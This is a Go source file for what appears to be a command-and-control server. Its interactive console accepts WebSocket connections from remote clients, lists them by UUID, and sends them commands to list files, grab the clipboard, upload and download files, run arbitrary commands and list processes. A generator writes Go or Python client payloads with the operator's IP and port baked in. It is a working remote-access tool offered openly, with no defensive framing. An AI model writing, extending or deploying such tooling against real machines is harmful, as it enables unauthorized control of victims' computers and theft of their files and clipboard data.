package main

import (
	"encoding/json"
	"fmt"
	"net/http"
	"os"
	"runtime"
	"strings"
	"sync"

	"github.com/chzyer/readline"
	"github.com/fatih/color"
	"github.com/google/uuid"
	"github.com/gorilla/websocket"
)

type Client struct {
	Conn *websocket.Conn
	UUID string
	Addr string
}

type ClientManager struct {
	Clients          map[string]*Client
	mu               sync.RWMutex
	addClientChan    chan *Client
	removeClientChan chan string
	messageChan      chan Message
}

type Message struct {
	UUID    string
	Content string
}

var availableCommands = []string{
	"list_files", "get_clipboard", "download_file", "upload_file", "execute_command", "list_processes", "help",
}

func NewClientManager() *ClientManager {
	return &ClientManager{
		Clients:          make(map[string]*Client),
		addClientChan:    make(chan *Client),
		removeClientChan: make(chan string),
		messageChan:      make(chan Message),
	}
}

func (cm *ClientManager) Start() {
	for {
		select {
		case client := <-cm.addClientChan:
			cm.mu.Lock()
			cm.Clients[client.UUID] = client
			cm.mu.Unlock()
			fmt.Printf("New connection: %s, UUID: %s\n", client.Addr, client.UUID)

		case uuid := <-cm.removeClientChan:
			cm.mu.Lock()
			delete(cm.Clients, uuid)
			cm.mu.Unlock()
			fmt.Printf("Connection closed: UUID: %s\n", uuid)

		case msg := <-cm.messageChan:
			cm.mu.RLock()
			if client, exists := cm.Clients[msg.UUID]; exists {
				response := map[string]string{"command": msg.Content}
				data, _ := json.Marshal(response)
				if err := client.Conn.WriteMessage(websocket.TextMessage, data); err != nil {
					fmt.Printf("Failed to send message: %v\n", err)
				} else {
					fmt.Printf("Message sent to UUID: %s, Content: %s\n", msg.UUID, msg.Content)
				}
			} else {
				fmt.Printf("Connection not found: %s\n", msg.UUID)
			}
			cm.mu.RUnlock()
		}
	}
}

func httpHandler(w http.ResponseWriter, r *http.Request) {
	fmt.Fprintln(w, "HTTP server is running")
}

func wsHandler(cm *ClientManager, conn *websocket.Conn) {
	defer conn.Close()

	address := conn.RemoteAddr().String()
	newUUID := uuid.New().String()
	client := &Client{Conn: conn, UUID: newUUID, Addr: address}

	cm.addClientChan <- client
	successMessage := map[string]string{"status": "success", "message": "Connection successful", "uuid": newUUID}
	data, _ := json.Marshal(successMessage)
	conn.WriteMessage(websocket.TextMessage, data)

	for {
		_, message, err := conn.ReadMessage()
		if err != nil {
			cm.removeClientChan <- newUUID
			break
		}
		fmt.Printf("Received message from %s: %s\n", address, message)
	}
}

func listClients(cm *ClientManager) []string {
	cm.mu.RLock()
	defer cm.mu.RUnlock()
	var uuids []string
	for _, client := range cm.Clients {
		uuids = append(uuids, client.UUID)
	}
	return uuids
}

func sendMessageToClient(cm *ClientManager, uuid, message string) {
	cm.messageChan <- Message{UUID: uuid, Content: message}
}

func generateClientTemplate(language, ip, port, osType, protocol string) error {
	var fileExt string
	switch language {
	case "go":
		fileExt = "go"
	case "python":
		fileExt = "py"
	default:
		return fmt.Errorf("unsupported language: %s", language)
	}

	templatePath := fmt.Sprintf("client/%s/%s_client.%s", language, protocol, fileExt)

	content, err := os.ReadFile(templatePath)
	if err != nil {
		return fmt.Errorf("failed to read template file: %v", err)
	}

	template := string(content)
	template = strings.ReplaceAll(template, "{ip}", ip)
	template = strings.ReplaceAll(template, "{port}", port)

	filename := fmt.Sprintf("client_%s.%s", language, fileExt)
	err = os.WriteFile(filename, []byte(template), 0644)
	if err != nil {
		return fmt.Errorf("failed to write client file: %v", err)
	}

	fmt.Printf("Client template generated: %s\n", filename)
	return nil
}

func printUseCommandHelp() {
	color.Set(color.FgCyan)
	fmt.Println("Available commands:")
	for _, cmd := range availableCommands {
		fmt.Printf("  %s\n", cmd)
	}
	color.Unset()
}

func printHelp() {
	color.Set(color.FgCyan)
	fmt.Println("Available commands:")
	fmt.Println("  http            Start HTTP server")
	fmt.Println("  websocket       Start WebSocket server")
	fmt.Println("  list websocket  List all active WebSocket connections")
	fmt.Println("  use <UUID>      Interact with a specific WebSocket connection (by UUID)")
	fmt.Println("  generate        Generate a client template with options: lang=<go|python> ip=<IP_ADDRESS> port=<PORT> protocol=<ws|wss>")
	fmt.Println("  help            Show this help information")
	color.Unset()
}

func handleGenerateCommand(params []string) {
	if len(params) == 0 {
		fmt.Println("Usage: generate lang=<go|python> ip=<IP_ADDRESS> port=<PORT> protocol=<ws|wss>")
		return
	}

	language := "go"
	ip := "127.0.0.1"
	port := "8081"
	osType := runtime.GOOS
	protocol := "ws"

	for _, param := range params {
		parts := strings.Split(param, "=")
		if len(parts) != 2 {
			fmt.Printf("Invalid parameter: %s\n", param)
			continue
		}
		key, value := parts[0], parts[1]
		switch key {
		case "lang":
			language = value
		case "ip":
			ip = value
		case "port":
			port = value
		case "os":
			osType = value
		case "protocol":
			protocol = value
		}
	}

	err := generateClientTemplate(language, ip, port, osType, protocol)
	if err != nil {
		fmt.Printf("Error generating client: %v\n", err)
	}
}

func handleUseCommand(cm *ClientManager, uuid string) {
	cm.mu.RLock()
	_, exists := cm.Clients[uuid]
	cm.mu.RUnlock()

	if !exists {
		color.Set(color.FgRed)
		fmt.Println("Connection not found")
		color.Unset()
		return
	}

	config := readline.Config{
		Prompt: fmt.Sprintf("Enter message for %s (or 'back' to return): ", uuid),
		AutoComplete: readline.NewPrefixCompleter(
			readline.PcItem("list_files"),
			readline.PcItem("get_clipboard"),
			readline.PcItem("download_file"),
			readline.PcItem("upload_file"),
			readline.PcItem("execute_command"),
			readline.PcItem("list_processes"),
			readline.PcItem("help"),
		),
	}
	rl, err := readline.NewEx(&config)
	if err != nil {
		fmt.Println("Failed to initialize readline:", err)
		return
	}
	defer rl.Close()

	for {
		line, err := rl.Readline()
		if err != nil {
			break
		}

		message := strings.TrimSpace(line)

		if message == "back" || message == "bk" {
			break
		}

		// Handle special commands
		switch message {
		case "list_files", "get_clipboard", "download_file", "upload_file", "execute_command", "list_processes":
			sendMessageToClient(cm, uuid, message)
		case "help":
			printUseCommandHelp()
		default:
			sendMessageToClient(cm, uuid, message)
		}
	}
}

func main() {
	cm := NewClientManager()
	go cm.Start()

	config := readline.Config{
		Prompt:      "Enter command: ",
		HistoryFile: ".readline.tmp",
		AutoComplete: readline.NewPrefixCompleter(
			readline.PcItem("http"),
			readline.PcItem("websocket"),
			readline.PcItem("list", readline.PcItem("websocket")),
			readline.PcItem("use"),
			readline.PcItem("generate"),
			readline.PcItem("help"),
		),
	}

	rl, err := readline.NewEx(&config)
	if err != nil {
		fmt.Println("Failed to initialize readline:", err)
		return
	}
	defer rl.Close()

	go func() {
		for {
			uuids := listClients(cm)
			var completers []readline.PrefixCompleterInterface
			for _, uuid := range uuids {
				completers = append(completers, readline.PcItem(uuid))
			}
			rl.Config.AutoComplete = readline.NewPrefixCompleter(
				readline.PcItem("http"),
				readline.PcItem("websocket"),
				readline.PcItem("list", readline.PcItem("websocket")),
				readline.PcItem("use", completers...),
				readline.PcItem("generate"),
				readline.PcItem("help"),
			)
		}
	}()

	for {
		line, err := rl.Readline()
		if err != nil {
			break
		}

		command := strings.Fields(line)
		if len(command) == 0 {
			continue
		}

		switch command[0] {
		case "use":
			if len(command) > 1 {
				handleUseCommand(cm, command[1])
			} else {
				fmt.Println("Usage: use <UUID>")
			}
		case "http":
			go http.ListenAndServe(":8080", http.HandlerFunc(httpHandler))
			color.Set(color.FgYellow)
			fmt.Println("HTTP server started on port 8080")
			color.Unset()
		case "websocket":
			http.HandleFunc("/ws", func(w http.ResponseWriter, r *http.Request) {
				upgrader := websocket.Upgrader{}
				upgrader.CheckOrigin = func(r *http.Request) bool { return true }
				conn, err := upgrader.Upgrade(w, r, nil)
				if err != nil {
					fmt.Println("Failed to upgrade to WebSocket:", err)
					return
				}
				wsHandler(cm, conn)
			})
			go http.ListenAndServe(":8081", nil)
			color.Set(color.FgYellow)
			fmt.Println("WebSocket server started on port 8081")
			color.Unset()
		case "list":
			if len(command) > 1 && command[1] == "websocket" {
				uuids := listClients(cm)
				fmt.Println("Active WebSocket sessions:")
				for _, uuid := range uuids {
					fmt.Println("UUID:", uuid)
				}
			} else {
				fmt.Println("Usage: list websocket")
			}
		case "generate":
			handleGenerateCommand(command[1:])
		case "help":
			printHelp()
		default:
			color.Set(color.FgRed)
			fmt.Println("Invalid command, please try again.")
			color.Unset()
		}
	}
}
